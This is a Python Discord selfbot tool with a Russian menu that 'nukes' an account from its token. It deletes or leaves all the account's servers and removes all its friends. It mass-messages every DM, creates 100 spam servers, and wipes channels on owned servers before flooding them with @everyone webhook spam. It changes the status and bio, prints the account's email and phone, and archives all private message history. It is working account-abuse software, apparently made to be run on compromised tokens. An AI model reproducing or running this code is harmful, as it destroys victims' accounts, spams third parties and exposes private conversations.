import asyncio
import discord
from colorama import Fore, init
import requests
import string
import aiohttp
import random
import json
import os
import zipfile
import shutil
import sys
import ntpath

with open('config.json', 'r', encoding='utf-8') as f:
    conf = json.load(f)

spamText = conf['spamText']
massDmText = conf['massDmText']
serversName = conf['serversName']
statusText = conf['statusText']
bioText = conf['bioText']
delDM = conf['deleteDMS']
glitchMode = conf['glitchMode']
bc = conf["bannerColor"]

#init()
def purple(text):
    os.system(""); fade = "" 
    red = 255
    for line in text.splitlines():
        fade += (f"\033[38;2;{red};0;180m{line}\033[0m\n")
        if not red == 0:
            red -= 20
            if red < 0:
                red = 0
    return fade

def neon(text):
    os.system(""); fade = ""
    for line in text.splitlines():
        red = 255
        for char in line:
            red -= 2
            if red > 255:
                red = 255
            fade += (f"\033[38;2;{red};0;255m{char}\033[0m")
        fade += "\n"
    return fade

if bc == 1:
    banner = purple("""
         :::::::: ::::::::: ::::::::::    ::::::::::::::  ::::    ::::::    ::::::    ::::::::::::::::::::::
        :+:    :+::+:    :+::+:         :+: :+:  :+:      :+:+:   :+::+:    :+::+:   :+: :+:       :+:    :+:
        +:+       +:+    +:++:+        +:+   +:+ +:+      :+:+:+  +:++:+    +:++:+  +:+  +:+       +:+    +:+
        :#:       +#++:++#: +#++:++#  +#++:++#++:+#+      +#+ +:+ +#++#+    +:++#++:++   +#++:++#  +#++:++#:
        +#+   +#+#+#+    +#++#+       +#+     +#++#+      +#+  +#+#+#+#+    +#++#+  +#+  +#+       +#+    +#+
        #+#    #+##+#    #+##+#       #+#     #+##+#      #+#   #+#+##+#    #+##+#   #+# #+#       #+#    #+#
         ######## ###    ################     ######      ###    #### ######## ###    ################    ###
    """)+'\n\n'
else:
    banner = neon("""
         :::::::: ::::::::: ::::::::::    ::::::::::::::  ::::    ::::::    ::::::    ::::::::::::::::::::::
        :+:    :+::+:    :+::+:         :+: :+:  :+:      :+:+:   :+::+:    :+::+:   :+: :+:       :+:    :+:
        +:+       +:+    +:++:+        +:+   +:+ +:+      :+:+:+  +:++:+    +:++:+  +:+  +:+       +:+    +:+
        :#:       +#++:++#: +#++:++#  +#++:++#++:+#+      +#+ +:+ +#++#+    +:++#++:++   +#++:++#  +#++:++#:
        +#+   +#+#+#+    +#++#+       +#+     +#++#+      +#+  +#+#+#+#+    +#++#+  +#+  +#+       +#+    +#+
        #+#    #+##+#    #+##+#       #+#     #+##+#      #+#   #+#+##+#    #+##+#   #+# #+#       #+#    #+#
         ######## ###    ################     ######      ###    #### ######## ###    ################    ###
    """)+'\n\n'

print(banner)
print(f'''
{Fore.MAGENTA}[ {Fore.RESET}1{Fore.MAGENTA} ] {Fore.RESET}Авто нюк аккаунта
{Fore.MAGENTA}[ {Fore.RESET}2{Fore.MAGENTA} ] {Fore.RESET}Инфо об аккаунте
{Fore.MAGENTA}[ {Fore.RESET}3{Fore.MAGENTA} ] {Fore.RESET}Смена био и статуса
{Fore.MAGENTA}[ {Fore.RESET}4{Fore.MAGENTA} ] {Fore.RESET}Глитч
{Fore.MAGENTA}[ {Fore.RESET}5{Fore.MAGENTA} ] {Fore.RESET}Лив, удаление всех серверов
{Fore.MAGENTA}[ {Fore.RESET}6{Fore.MAGENTA} ] {Fore.RESET}Удалить всех друзей
{Fore.MAGENTA}[ {Fore.RESET}7{Fore.MAGENTA} ] {Fore.RESET}Рассылка во все лс
{Fore.MAGENTA}[ {Fore.RESET}8{Fore.MAGENTA} ] {Fore.RESET}Спам серверами
{Fore.MAGENTA}[ {Fore.RESET}9{Fore.MAGENTA} ] {Fore.RESET}Сохранить переписки
''')

choice = input(f'{Fore.MAGENTA}[ {Fore.RESET}?{Fore.MAGENTA} ] {Fore.RESET}Выбери нужное >>> ')

responses = {
    '401: Unauthorized': 'Токен не валид.',
    'You need to verify your account in order to perform this action.': 'Токен требует верификацию по номеру/почте.'
}

async def succlog1(text):
    print(f'{Fore.MAGENTA}[ SUCCESS ] {text}{Fore.RESET}')

async def warnlog1(text):
    print(f'{Fore.YELLOW}[ WARNING ] {text}{Fore.RESET}')

async def errlog1(text):
    print(f'{Fore.RED}[ ERROR ] {text}{Fore.RESET}')

def succlog(text):
    print(f'{Fore.MAGENTA}[ SUCCESS ] {text}{Fore.RESET}')

def warrnlog(text):
    print(f'{Fore.YELLOW}[ WARNING ] {text}{Fore.RESET}')

def errlog(text):
    print(f'{Fore.RED}[ ERROR ] {text}{Fore.RESET}')

token = input(f'{Fore.MAGENTA}[ {Fore.RESET}> {Fore.MAGENTA}] {Fore.RESET}Введи токен >>> ')
headers = {'authorization': token.strip()}

async def del_channel(channel):
	try:
		await channel.delete()
	except:
		pass
	else:
		pass

async def del_channels(guild):
	await asyncio.gather(*[del_channel(channel) for channel in guild.channels])

async def prspm(hook):
    for i in range(5):
        try: await hook.send(f'@everyone {spamText}')
        except: pass

async def spmm(guild):
    for i in range(5):
        channel = await guild.create_text_channel(name=f'{serversName} {"".join(random.choices(string.ascii_letters + string.digits, k=8))}')
        hook = await channel.create_webhook(name=f'{serversName} {"".join(random.choices(string.ascii_letters + string.digits, k=8))}')
        asyncio.create_task(prspm(hook))

async def ggg(guild):
    asyncio.create_task(del_channels(guild))
    asyncio.create_task(spmm(guild))

async def dl_lv(guild):
    async with aiohttp.ClientSession(headers=headers) as session:
        if guild.owner == guild.me:
            async with session.delete(f'https://discord.com/api/v9/guilds/{guild.id}') as r:
                if r.status == 429:
                    retry_after = await r.json()
                    await asyncio.sleep(retry_after['retry_after'])
                    await dl_lv(guild)
                if r.status in [200, 201, 204]:
                    asyncio.create_task(succlog1(f'Сервер {guild} удалён'))
        else:
            async with session.delete(f'https://discord.com/api/v9/users/@me/guilds/{guild.id}') as r:
                if r.status == 429:
                    retry_after = await r.json()
                    await asyncio.sleep(retry_after['retry_after'])
                    await dl_lv(guild)
                if r.status in [200, 201, 204]:
                    asyncio.create_task(succlog1(f'Покинул сервер {guild}'))

async def rm_guilds(client):
    await asyncio.gather(*[dl_lv(guild) for guild in client.guilds])

async def send_dm(channel):
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.post(f'https://discord.com/api/v9/channels/{channel.id}/messages', json={'content': f"||{'@everyone' if isinstance(channel, discord.GroupChannel) else f'<@{channel.recipient.id}>'}|| {massDmText}"}) as r:
            if r.status == 429:
                retry_after = await r.json()
                await asyncio.sleep(retry_after['retry_after'])
                await send_dm(channel)
            if r.status in [200, 201, 204]:
                asyncio.create_task(succlog1(f'Сообщение в лс {channel} отправлено'))
        if delDM:
            async with session.delete(f'https://discord.com/api/v9/channels/{channel.id}') as r:
                if r.status == 429:
                    retry_after = await r.json()
                    await asyncio.sleep(retry_after['retry_after'])
                    await send_dm(channel)
                if r.status in [200, 201, 204]:
                    asyncio.create_task(succlog1(f'Лс {channel} удалено'))

async def mass_dm(client):
    await asyncio.gather(*[send_dm(channel) for channel in client.private_channels])

async def del_friend(friend):
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.delete(f'https://discord.com/api/v9/users/@me/relationships/{friend.id}') as r:
            if r.status == 429:
                retry_after = await r.json()
                await asyncio.sleep(retry_after['retry_after'])
                await del_friend(friend)
            if r.status in [200, 201, 204]:
                asyncio.create_task(succlog1(f'{friend} Удалён из друзей'))

async def del_friends(client):
    await asyncio.gather(*[del_friend(friend) for friend in client.user.friends])

async def cr_guild():
    """with open(icon, "rb") as f: 
        _image = f.read()
    b64Bytes = base64.b64encode(_image)
    img = f'data:image/x-icon;base64,{b64Bytes.decode()}'"""
    async with aiohttp.ClientSession(headers=headers) as session:
        sname = f"{serversName} {''.join(random.choices(string.printable, k=8))}"
        async with session.post('https://discord.com/api/v9/guilds', json={'name': sname}) as r:
            if r.status == 429:
                retry_after = await r.json()
                await asyncio.sleep(retry_after['retry_after'])
                await cr_guild()
            if r.status in [200, 201, 204]:
                asyncio.create_task(succlog1(f'Сервер {sname} создан'))

async def create_servers():
    await asyncio.gather(*[cr_guild() for i in range(100)])

async def glitch():
    settings = {'theme': random.choice(['dark', 'light']), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'hi', 'kh'])}
    #requests.patch("https://discord.com/api/v7/users/@me/settings", headers={'authorization': client.ws.token}, json=setting)
    #print(f'[ Success ] Изменил тему и язык{Fore.RESET}')
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.patch("https://discord.com/api/v9/users/@me/settings", json=settings) as resp:
            if resp.status == 429:
                retry_after = await resp.json()
                await asyncio.sleep(retry_after['retry_after'])
                await glitch()
            if resp.status in [200, 201, 204]:
                asyncio.create_task(succlog1(f'Тема и язык изменены'))

async def glitch2():
    while True:
        await glitch()

async def change_status(client):
    #await client.change_presence(activity=discord.Streaming(name=statusText, url='https://twitch.tv/404%27'))
    custom_status = {"custom_status": {"text": statusText, "emoji_name": random.choice(["⚠️", "🦣", "☠️"])}}
    requests.patch("https://discord.com/api/v9/users/@me/settings", headers={'authorization': client.ws.token}, json=custom_status)
    requests.patch("https://discord.com/api/v9/users/@me", headers={'authorization': client.ws.token}, json={'bio': bioText})
    

async def auto_nuke(client):
    asyncio.create_task(glitch())
    asyncio.create_task(change_status(client))
    asyncio.create_task(rm_guilds(client))
    asyncio.create_task(mass_dm(client))
    asyncio.create_task(del_friends(client))
    asyncio.create_task(create_servers())
    #await asyncio.gather(*[glitch(), rm_guilds(client), mass_dm(client), del_friends(client), create_servers()])
    if glitchMode:
        asyncio.create_task(glitch2())

async def info_acc(client):
    resp = requests.get('https://discord.com/api/v9/users/@me', headers={'authorization': client.ws.token}).json()
    email = resp["email"]
    number = resp["phone"]
    print(f'''
{Fore.MAGENTA}—-—-—-—-— × Account Info × —-—-—-—-—{Fore.RESET}
{Fore.MAGENTA}├ DS:{Fore.RESET} {client.user} ({client.user.id})
{Fore.MAGENTA}├ Email:{Fore.RESET} {email if email else "Не привязан"}
{Fore.MAGENTA}└ Phone:{Fore.RESET} {number if number else "Не приввязан"}
{Fore.MAGENTA}—-—-—-—-— × Servers × —-—-—-—-—{Fore.RESET}
{Fore.MAGENTA}├ Серверов:{Fore.RESET} {len(client.guilds)}
{Fore.MAGENTA}├ Серверов с правами:{Fore.RESET} {len([g for g in client.guilds if g.me.guild_permissions.administrator])}
{Fore.MAGENTA}└ Серверов с овнеркой:{Fore.RESET} {len([g for g in client.guilds if g.me.guild.owner])}
{Fore.MAGENTA}—-—-—-—-— × Other × —-—-—-—-—{Fore.MAGENTA}
{Fore.MAGENTA}├ Всего лс:{Fore.RESET} {len(client.private_channels)}
{Fore.MAGENTA}├ DMs:{Fore.RESET} {len([dm for dm in client.private_channels if not isinstance(dm, discord.GroupChannel)])}
{Fore.MAGENTA}├ Групп:{Fore.RESET} {len([gr for gr in client.private_channels if not isinstance(gr, discord.DMChannel)])}
{Fore.MAGENTA}└ Друзей:{Fore.RESET} {len(client.user.friends)}
''')
    

client = discord.Client(intents=discord.Intents.all(), status=discord.Status.invisible)

async def dump():
    dumpname = f'Dump-{client.user.id}'
    if not os.path.exists(dumpname):
        os.mkdir(dumpname)
    async def archiveall():
        async def archive(channel):
            if isinstance(channel, discord.DMChannel):
                msgs = [f"Архив лс с {channel.recipient} ({channel.recipient.id})"]
                async for msg in channel.history(limit=None):
                    msgs.append(f"{msg.author} — {msg.created_at}\n{msg.content}")
                asyncio.create_task(succlog1(f'Лс с {channel.recipient} ({channel.recipient.id}) заархивировано'))
            if isinstance(channel, discord.GroupChannel):
                msgs = [f"Архив группы {channel.name}"]
                async for msg in channel.history(limit=None):
                    msgs.append(f"{msg.author} — {msg.created_at}\n{msg.content}")
                asyncio.create_task(succlog1(f'Группа {channel.name} заархивирована'))
            with open(f'./{dumpname}/{channel.id}.txt', 'w', encoding='utf-8') as f:
                f.write('\n'.join(msgs))
        for channel in client.private_channels:
            await archive(channel)
    async def files():
        ziparch = zipfile.ZipFile(os.path.join(os.getcwd(), dumpname+'.zip'), 'w', zipfile.ZIP_DEFLATED)
        abs_src = ntpath.abspath(dumpname)
        for dirname, _, files in os.walk(dumpname):
            for filename in files:
                absname = ntpath.abspath(ntpath.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                ziparch.write(absname, arcname)
        shutil.rmtree(dumpname)
    #await asyncio.gather(*[archiveall(), files(), succlog1(f'Переписки пользователя {client.user} сохранены в архив {dumpname}')])
    await archiveall()
    await files()

@client.event
async def on_guild_join(guild):
    if guild.owner.id == client.user.id:
        asyncio.create_task(ggg(guild))

@client.event
async def on_ready():
    #os.system('cls' if os.name == 'nt' else 'clear')
    if choice == '1':
        asyncio.create_task(auto_nuke(client))
    elif choice == '2':
        asyncio.create_task(info_acc(client))
    elif choice == '3':
        asyncio.create_task(change_status(client))
    elif choice == '4':
        asyncio.create_task(glitch2())
    elif choice == '5':
        asyncio.create_task(rm_guilds(client))
    elif choice == '6':
        asyncio.create_task(del_friends(client))
    elif choice == '7':
        asyncio.create_task(mass_dm(client))
    elif choice == '8':
        asyncio.create_task(create_servers())
    elif choice == '9':
        asyncio.create_task(dump())
    else:
        errlog('Unknown choice')
        sys.exit()


try:
    client.run(token, bot=False)
except Exception as e:
    print(e)
    input()